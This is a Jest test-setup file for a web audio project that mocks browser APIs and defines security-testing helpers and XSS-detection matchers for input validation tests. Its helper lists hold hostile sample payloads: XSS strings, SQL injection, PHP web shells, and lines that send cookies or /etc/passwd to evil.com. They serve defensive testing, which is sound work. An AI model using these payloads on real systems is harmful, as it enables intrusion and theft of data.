/**
 * Shared Jest setup for both projects in jest.config.cjs (Unit Tests and Security Tests),
 * run before every test file. Polyfills TextEncoder/TextDecoder; stubs crypto, fetch,
 * performance (now() is Date.now(), so millisecond resolution), AudioContext and a minimal
 * global THREE; seeds the page globals (sonoiteData, sonoiteSecurityConfig) in the shape the legacy
 * runtime's WordPress payload had;
 * and registers the SecurityTestUtils helpers and custom matchers for tests/security.
 */

import { TextDecoder, TextEncoder } from 'util';

if (typeof global.TextEncoder === 'undefined') {
  global.TextEncoder = TextEncoder;
}

if (typeof global.TextDecoder === 'undefined') {
  global.TextDecoder = TextDecoder;
}

// Web Crypto stub
const mockCrypto = {
  subtle: {
    digest: jest.fn().mockResolvedValue(new ArrayBuffer(32)),
    encrypt: jest.fn(),
    decrypt: jest.fn(),
    generateKey: jest.fn(),
    importKey: jest.fn(),
    exportKey: jest.fn()
  },
  getRandomValues: jest.fn((array) => {
    for (let i = 0; i < array.length; i++) {
      array[i] = Math.floor(Math.random() * 256);
    }
    return array;
  })
};

global.crypto = mockCrypto;

try {
  Object.defineProperty(globalThis, 'crypto', {
    value: mockCrypto,
    configurable: true
  });
} catch (error) {
  // Ignore environments that lock down the global crypto property
}

if (typeof global.window !== 'undefined') {
  try {
    Object.defineProperty(global.window, 'crypto', {
      value: mockCrypto,
      configurable: true
    });
  } catch (error) {
    // Ignore jsdom property definition failures in environments where crypto is non-configurable
  }
}

// fetch resolves an empty 200 response unless a test overrides it
global.fetch = jest.fn().mockResolvedValue({
  ok: true,
  status: 200,
  headers: {
    get: jest.fn(() => null)
  },
  json: jest.fn().mockResolvedValue({}),
  text: jest.fn().mockResolvedValue(''),
  arrayBuffer: jest.fn().mockResolvedValue(new ArrayBuffer(8))
});

// Mock performance API
global.performance = {
  now: jest.fn(() => Date.now()),
  mark: jest.fn(),
  measure: jest.fn(),
  getEntriesByType: jest.fn(() => [])
};

// Mock AudioContext
global.AudioContext = jest.fn().mockImplementation(() => ({
  createAnalyser: jest.fn(() => ({
    fftSize: 256,
    frequencyBinCount: 128,
    getByteFrequencyData: jest.fn(),
    getByteTimeDomainData: jest.fn(),
    connect: jest.fn(),
    disconnect: jest.fn()
  })),
  createGain: jest.fn(() => ({
    gain: { value: 1, setValueAtTime: jest.fn(), linearRampToValueAtTime: jest.fn() },
    connect: jest.fn(),
    disconnect: jest.fn()
  })),
  createBufferSource: jest.fn(() => ({
    buffer: null,
    start: jest.fn(),
    stop: jest.fn(),
    connect: jest.fn(),
    disconnect: jest.fn(),
    addEventListener: jest.fn()
  })),
  decodeAudioData: jest.fn().mockResolvedValue({
    duration: 180,
    sampleRate: 44100,
    numberOfChannels: 2
  }),
  destination: {},
  currentTime: 0,
  state: 'running',
  resume: jest.fn().mockResolvedValue(),
  close: jest.fn().mockResolvedValue(),
  addEventListener: jest.fn()
}));

global.webkitAudioContext = global.AudioContext;

// Minimal global THREE for code that reads window.THREE; `import 'three'` still loads the real library
global.THREE = {
  Scene: jest.fn().mockImplementation(() => ({
    add: jest.fn(),
    remove: jest.fn(),
    traverse: jest.fn(),
    background: null,
    fog: null
  })),
  PerspectiveCamera: jest.fn().mockImplementation(() => ({
    position: { set: jest.fn(), x: 0, y: 0, z: 10 },
    aspect: 1,
    updateProjectionMatrix: jest.fn()
  })),
  WebGLRenderer: jest.fn().mockImplementation(() => ({
    setSize: jest.fn(),
    setPixelRatio: jest.fn(),
    render: jest.fn(),
    dispose: jest.fn(),
    domElement: document.createElement('canvas')
  })),
  Vector2: jest.fn().mockImplementation((x = 0, y = 0) => ({
    x, y,
    set: jest.fn(),
    copy: jest.fn(),
    add: jest.fn(),
    sub: jest.fn(),
    multiply: jest.fn(),
    length: jest.fn(() => Math.sqrt(x * x + y * y)),
    normalize: jest.fn(),
    lerp: jest.fn()
  })),
  Vector3: jest.fn().mockImplementation((x = 0, y = 0, z = 0) => ({
    x, y, z,
    set: jest.fn(),
    copy: jest.fn(),
    add: jest.fn(),
    sub: jest.fn(),
    multiply: jest.fn(),
    length: jest.fn(() => Math.sqrt(x * x + y * y + z * z)),
    normalize: jest.fn(),
    lerp: jest.fn()
  })),
  Color: jest.fn().mockImplementation(() => ({
    r: 1, g: 1, b: 1,
    set: jest.fn(),
    setHex: jest.fn(),
    copy: jest.fn()
  })),
  Mesh: jest.fn().mockImplementation(() => ({
    position: { set: jest.fn(), x: 0, y: 0, z: 0 },
    rotation: { set: jest.fn(), x: 0, y: 0, z: 0 },
    scale: { set: jest.fn(), x: 1, y: 1, z: 1 },
    visible: true,
    material: null,
    geometry: null
  })),
  Group: jest.fn().mockImplementation(() => ({
    add: jest.fn(),
    remove: jest.fn(),
    position: { set: jest.fn(), x: 0, y: 0, z: 0 },
    rotation: { set: jest.fn(), x: 0, y: 0, z: 0 },
    scale: { set: jest.fn(), x: 1, y: 1, z: 1 }
  })),
  ShaderMaterial: jest.fn().mockImplementation(() => ({
    uniforms: {},
    vertexShader: '',
    fragmentShader: '',
    transparent: false,
    dispose: jest.fn()
  })),
  BufferGeometry: jest.fn().mockImplementation(() => ({
    setAttribute: jest.fn(),
    dispose: jest.fn()
  })),
  BufferAttribute: jest.fn().mockImplementation(() => ({
    array: new Float32Array(),
    count: 0,
    needsUpdate: false
  }))
};

// Security testing utilities
global.SecurityTestUtils = {
  // Generate malicious payloads for XSS testing
  generateXSSPayloads: () => [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '<img src="x" onerror="alert(\'xss\')">',
    '<iframe src="javascript:alert(\'xss\')"></iframe>',
    '<svg onload="alert(\'xss\')">',
    '"><script>alert("xss")</script>',
    '\';alert("xss");//',
    '<script>eval("alert(\'xss\')")</script>'
  ],

  // Generate SQL injection payloads
  generateSQLInjectionPayloads: () => [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "'; UPDATE users SET password='hacked' WHERE id=1; --"
  ],

  // Generate malicious file content
  generateMaliciousFileContent: () => [
    '<?php eval($_GET["cmd"]); ?>',
    '<?php system($_POST["cmd"]); ?>',
    '<script>document.location="http://evil.com?data="+document.cookie</script>',
    '<?php file_get_contents("http://evil.com/steal.php?data=".file_get_contents("/etc/passwd")); ?>'
  ],

  // Generate malicious URLs
  generateMaliciousURLs: () => [
    'javascript:alert("xss")',
    'data:text/html,<script>alert("xss")</script>',
    'http://evil.com/malware.exe',
    'file:///etc/passwd',
    'ftp://anonymous:password@evil.com/upload',
    '../../../etc/passwd',
    'http://localhost:22/ssh-attack'
  ],

  // Create mock malicious file
  createMaliciousFile: (content = '<?php eval($_GET["cmd"]); ?>') => ({
    name: 'malicious.php',
    type: 'application/x-php',
    size: content.length,
    arrayBuffer: () => Promise.resolve(new TextEncoder().encode(content)),
    text: () => Promise.resolve(content)
  }),

  // Create mock legitimate file
  createLegitimateFile: (type = 'audio/mpeg') => ({
    name: 'legitimate.mp3',
    type: type,
    size: 1024 * 1024, // 1MB
    arrayBuffer: () => Promise.resolve(new ArrayBuffer(1024 * 1024)),
    text: () => Promise.resolve('legitimate audio content')
  }),

  // Security event assertions
  expectSecurityEvent: (eventType, securityManager) => {
    const events = securityManager.auditLog || [];
    const found = events.some(event => event.event === eventType);
    expect(found).toBe(true);
  },

  // Rate limiting simulation
  simulateRateLimitExceed: async (fn, attempts = 10) => {
    const results = [];
    for (let i = 0; i < attempts; i++) {
      try {
        results.push(await fn());
      } catch (error) {
        results.push(error);
      }
    }
    return results;
  },

  // Mock dangerous global functions
  mockDangerousGlobals: () => {
    global.eval = jest.fn();
    global.Function = jest.fn();
    global.setTimeout = jest.fn();
    global.setInterval = jest.fn();
  },

  // Restore original globals
  restoreGlobals: () => {
    // This would restore original functions if needed
  }
};

// Security-focused custom matchers
expect.extend({
  toBeSecureInput(received) {
    const xssPatterns = [
      /<script[^>]*>.*?<\/script>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<iframe[^>]*>.*?<\/iframe>/gi
    ];

    const isSecure = !xssPatterns.some(pattern => pattern.test(received));

    return {
      message: () => `Expected input to be secure but found potential XSS pattern`,
      pass: isSecure
    };
  },

  toBeValidatedInput(received, validationRules) {
    let isValid = true;
    let failedRule = '';

    if (validationRules.maxLength && received.length > validationRules.maxLength) {
      isValid = false;
      failedRule = 'maxLength';
    }

    if (validationRules.pattern && !validationRules.pattern.test(received)) {
      isValid = false;
      failedRule = 'pattern';
    }

    if (validationRules.sanitized && received !== received.replace(/<[^>]*>/g, '')) {
      isValid = false;
      failedRule = 'sanitized';
    }

    return {
      message: () => `Expected input to pass validation but failed rule: ${failedRule}`,
      pass: isValid
    };
  },

  toHaveSecurityHeaders(received) {
    const requiredHeaders = [
      'Content-Security-Policy',
      'X-Frame-Options',
      'X-Content-Type-Options',
      'X-XSS-Protection'
    ];

    const missingHeaders = requiredHeaders.filter(header => 
      !received.headers || !received.headers[header]
    );

    return {
      message: () => `Expected response to have security headers but missing: ${missingHeaders.join(', ')}`,
      pass: missingHeaders.length === 0
    };
  },

  toBeWithinRateLimit(received, limit) {
    const requestCount = Array.isArray(received) ? received.length : received;
    
    return {
      message: () => `Expected ${requestCount} requests to be within rate limit of ${limit}`,
      pass: requestCount <= limit
    };
  }
});

// Page globals in the shape WordPress's wp_localize_script payload had (the theme layer was removed in
// Prompt #249). The legacy runtime and the security suites read these; Path B now gets sonoiteData from
// src/js/site/site-data.js, and tests that need its shape build it there.
global.window.sonoiteSecurityConfig = {
  enableCSPReporting: true,
  enableIntegrityChecks: true,
  enableInputValidation: true,
  enableXSSProtection: true,
  enableAuditLogging: true,
  maxFormSubmissions: 5,
  formSubmissionWindow: 60000,
  allowedDomains: ['localhost'],
  reportingEndpoint: '/wp-json/sonoite/v1/security-report',
  maxFileSize: 50 * 1024 * 1024,
  allowedMimeTypes: ['audio/mpeg', 'audio/wav', 'audio/ogg', 'audio/mp4']
};

global.window.sonoiteData = {
  apiUrl: '/wp-json/sonoite/v1/',
  tracks: [],
  themeUrl: '/wp-content/themes/sonoite-theme',
  nonce: 'test-nonce-12345',
  version: '1.0.0',
  isSecure: true
};

// Per-test cleanup for every suite
afterEach(() => {
  // Clean up any security test artifacts
  if (global.SecurityTestUtils) {
    global.SecurityTestUtils.restoreGlobals();
  }
  
  // Reset mocks
  jest.clearAllMocks();
  
  // Clear any timers
  jest.clearAllTimers();
});

// Same value as testTimeout in jest.config.cjs
jest.setTimeout(30000);
